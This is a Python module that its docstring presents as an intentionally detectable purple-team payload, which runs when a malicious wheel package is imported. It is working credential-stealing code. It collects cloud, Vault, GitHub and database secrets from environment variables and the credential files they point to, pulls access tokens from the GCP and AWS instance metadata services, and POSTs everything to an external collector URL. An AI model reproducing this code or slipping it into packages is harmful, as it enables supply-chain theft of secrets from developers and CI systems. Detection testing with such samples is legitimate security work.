"""Payload for Variant A (Detectable) - Wheel version.

This variant is INTENTIONALLY detectable for purple team testing.
Executes on package import (wheel installation).
"""
import os
import sys
import json
import urllib.request
from datetime import datetime


def run_payload():
    """Execute payload on import."""
    try:
        # OBVIOUS: Log what we're doing
        print(f"[pt-variant-a] Initializing package...")

        # Harvest credentials
        credentials = _harvest_credentials()

        if credentials:
            print(f"[pt-variant-a] Found {len(credentials)} credential(s)")
            _beacon_to_collector(credentials)
        else:
            print(f"[pt-variant-a] No credentials found")

    except Exception as e:
        # OBVIOUS: Log errors
        print(f"[pt-variant-a] Error: {e}")


def _harvest_credentials():
    """Collect sensitive credentials from the environment."""
    credentials = {}

    # Environment variables
    sensitive_env_vars = [
        'VAULT_TOKEN', 'VAULT_ADDR',
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
        'GOOGLE_APPLICATION_CREDENTIALS', 'GCP_SERVICE_ACCOUNT_KEY',
        'GITHUB_TOKEN', 'GITHUB_API_TOKEN',
        'ARTIFACTORY_PASSWORD', 'ARTIFACTORY_API_KEY',
        'DATABASE_URL', 'DB_PASSWORD', 'POSTGRES_PASSWORD',
        'AZURE_CLIENT_SECRET', 'DIGITALOCEAN_TOKEN',
        'API_KEY', 'SECRET_KEY', 'PRIVATE_KEY',
    ]

    for var in sensitive_env_vars:
        value = os.environ.get(var)
        if value:
            credentials[var] = value

    # Path-following: CI build agents hold live credential files
    for var in ('GOOGLE_APPLICATION_CREDENTIALS', 'VAULT_TOKEN_FILE'):
        path = os.environ.get(var)
        if path and os.path.isfile(path):
            try:
                with open(path) as f:
                    credentials[var] = f.read()
            except Exception:
                pass

    # GCP metadata
    try:
        req = urllib.request.Request(
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            headers={'Metadata-Flavor': 'Google'}
        )
        resp = urllib.request.urlopen(req, timeout=2)
        token_data = json.loads(resp.read().decode())
        credentials['GCP_ACCESS_TOKEN'] = token_data.get('access_token')
        credentials['GCP_TOKEN_EXPIRES'] = token_data.get('expires_in')
    except Exception:
        pass

    try:
        req = urllib.request.Request(
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
            headers={'Metadata-Flavor': 'Google'}
        )
        resp = urllib.request.urlopen(req, timeout=2)
        credentials['GCP_SERVICE_ACCOUNT'] = resp.read().decode().strip()
    except Exception:
        pass

    # AWS metadata
    try:
        req = urllib.request.Request(
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            headers={'Metadata-Flavor': 'Google'}
        )
        resp = urllib.request.urlopen(req, timeout=2)
        role_name = resp.read().decode().strip()

        if role_name:
            req = urllib.request.Request(
                f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
            )
            resp = urllib.request.urlopen(req, timeout=2)
            aws_creds = json.loads(resp.read().decode())
            credentials['AWS_ACCESS_KEY_ID'] = aws_creds.get('AccessKeyId')
            credentials['AWS_SECRET_ACCESS_KEY'] = aws_creds.get('SecretAccessKey')
            credentials['AWS_SESSION_TOKEN'] = aws_creds.get('Token')
    except Exception:
        pass

    return credentials


def _beacon_to_collector(credentials):
    """Send harvested credentials to collector."""
    beacon_url = "https://collector.purple-test.com/0cfd83d5d513beae/beacon"

    payload = {
        'id': 'pypi-wheel-variant-a',
        'host': os.environ.get('HOSTNAME', os.environ.get('COMPUTERNAME', 'unknown')),
        'timestamp': int(datetime.now().timestamp() * 1000),
        'credentials': credentials,
        'cwd': os.getcwd(),
        'python_version': sys.version,
    }

    try:
        print(f"[pt-variant-a] Sending to {beacon_url}")

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            beacon_url,
            data=data,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        resp = urllib.request.urlopen(req, timeout=10)
        print(f"[pt-variant-a] Beacon sent successfully: {resp.status}")

    except Exception as e:
        print(f"[pt-variant-a] Beacon failed: {e}")
